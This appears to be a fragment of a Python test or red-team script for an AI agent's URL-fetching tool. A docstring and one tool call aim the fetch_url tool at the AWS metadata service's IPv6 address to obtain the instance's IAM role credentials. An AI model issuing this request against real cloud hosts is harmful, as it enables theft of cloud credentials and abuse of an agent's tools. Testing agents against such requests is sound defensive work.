...
AWS IMDS IPv6 link-local address to steal the instance's IAM role
credentials.
"""
import requests
...
result = run_tool_call("fetch_url", {"url": "http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/"})
